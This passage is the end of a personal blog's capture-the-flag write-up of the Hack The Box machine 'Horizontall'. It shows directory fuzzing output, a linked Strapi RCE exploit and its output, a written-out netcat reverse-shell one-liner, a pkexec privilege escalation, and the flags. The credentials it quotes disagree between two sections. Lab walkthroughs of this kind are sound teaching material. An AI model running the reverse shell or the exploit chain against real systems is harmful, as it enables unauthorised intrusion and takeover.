+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://api-prod.horizontall.htb/FUZZ/ -w /usr/share/wordlists/dirb/common.txt  -of md -o dir.api-prod.horz.common
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.1 Kali Exclusive &lt;<span class="m">3</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://api-prod.horizontall.htb/FUZZ/
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"> :: Output file      : dir.api-prod.horz.common
+</span></span><span class="line"><span class="cl"> :: File format      : md
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span>
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
+</span></span><span class="line"><span class="cl">ADMIN                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Admin                   <span class="o">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span class="o">]</span>
+</span></span><span class="line"><span class="cl">connect                 <span class="o">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.html              <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span>
+</span></span><span class="line"><span class="cl">robots.txt              <span class="o">[</span>Status: 200, Size: 121, Words: 19, Lines: 4<span class="o">]</span>
+</span></span><span class="line"><span class="cl">reviews                 <span class="o">[</span>Status: 200, Size: 507, Words: 21, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">users                   <span class="o">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>4614/4614<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">235</span> req/sec :: Duration: <span class="o">[</span>0:00:23<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="33-login-portal">3.3 Login portal</h3>
+<figure><img src="/images/horizontall-strapi.png"/><figcaption>
+            <h4>Login Portal</h4>
+        </figcaption>
+</figure>
+
+<h3 id="34-vulnerability">3.4 Vulnerability</h3>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/50239" target="_blank" rel="noopener noreffer">Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) - Multiple webapps Exploit (exploit-db.com)</a>
+<figure><img src="/images/horizontall-strapi-version.png"/><figcaption>
+            <h4>Version Identification</h4>
+        </figcaption>
+</figure>
+</li>
+</ul>
+<h2 id="4-foothold">4. Foothold</h2>
+<h3 id="41-shell">4.1 Shell</h3>
+<figure><img src="/images/horizontall-footholda.png"/><figcaption>
+            <h4>Blind RCE</h4>
+        </figcaption>
+</figure>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+<span class="o">]</span> Checking Strapi CMS Version running
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Seems like the exploit will work!!!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Executing exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password reset was successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Your email is: admin@horizontall.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Your new credentials are: admin:SuperStrongPassword1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTUyNzU2LCJleHAiOjE2NDY1NDQ3NTZ9.ucoeJpyivBWFaRCG8IAmfXUEH_2Q0emD9yBqckOkmfI
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It does work as I looged GET request on  web server. I had to do this to ensure that blind RCE was working.</p>
+<figure><img src="/images/horizontall-footholdb.png"/><figcaption>
+            <h4>Verifing Blind RCE</h4>
+        </figcaption>
+</figure>
+
+<h3 id="42-reverse-shell">4.2 Reverse Shell</h3>
+<ul>
+<li>Shell used</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.14.20 <span class="m">4242</span> &gt;/tmp/f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/images/horizontall_revshell.png"/><figcaption>
+            <h4>Reverse Shell</h4>
+        </figcaption>
+</figure>
+
+<h3 id="43-user-flag">4.3 User Flag</h3>
+<figure><img src="/images/horizontall_uf.png"/><figcaption>
+            <h4>User Flag</h4>
+        </figcaption>
+</figure>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1e76ca9ddad1b45992f9701539d9ce9b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5-privilege-escalation">5. Privilege Escalation</h2>
+<ul>
+<li>pkexec vulnerable using Linpeas</li>
+</ul>
+<figure><img src="/images/horizontall_pv_1.png"/><figcaption>
+            <h4>LinPEAS output</h4>
+        </figcaption>
+</figure>
+
+<h2 id="51-exploit">5.1 Exploit</h2>
+<p><a href="https://github.com/arthepsy/CVE-2021-4034.git" target="_blank" rel="noopener noreffer">Exploit used</a></p>
+<ul>
+<li>
+<p>Uploaded file using the strapi panel (credentials from Foothold exploit admin:SuperSecretPassword1)
+<figure><img src="/images/horizontall_pv_2.png"/>
+</figure>
+</p>
+</li>
+<li>
+<p>Compile the exploit
+<figure><img src="/images/horizontall_pv_3.png"/><figcaption>
+            <h4>Compiling the exploit</h4>
+        </figcaption>
+</figure>
+</p>
+</li>
+<li>
+<p>Execute exploit
+<figure><img src="/images/horizontall_pv_4.png"/><figcaption>
+            <h4>Executing the exploit</h4>
+        </figcaption>
+</figure>
+</p>
+</li>
+</ul>
+<h2 id="52-root-flag">5.2 Root Flag</h2>
+<p>Et voila
+<figure><img src="/images/horizontall_pv_5.png"/><figcaption>
+            <h4>Hehehe! And all this you were busy thinking we wouldn&#39;t be able to do this</h4>
+        </figcaption>
+</figure>
+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cat root.txt</span>
+</span></span><span class="line"><span class="cl">e1581bd68329ddd2aacdfb01631ab02d
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-02-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hacksstuff/firstpost/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" data-title="HTB Horizontall Writeup" data-hashtags="Easy,Linux,Retired"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" data-hashtag="Easy"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" data-title="HTB Horizontall Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" data-title="HTB Horizontall Writeup"><i data-svg-src="/hacksstuff/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" data-title="HTB Horizontall Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/hacksstuff/tags/easy/">Easy</a>,&nbsp;<a href="/hacksstuff/tags/linux/">Linux</a>,&nbsp;<a href="/hacksstuff/tags/retired/">Retired</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/hacksstuff/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/hacksstuff/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/hacksstuff/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"twemoji":true};</script><script type="text/javascript" src="/hacksstuff/js/theme.min.js"></script></body>
+</html>
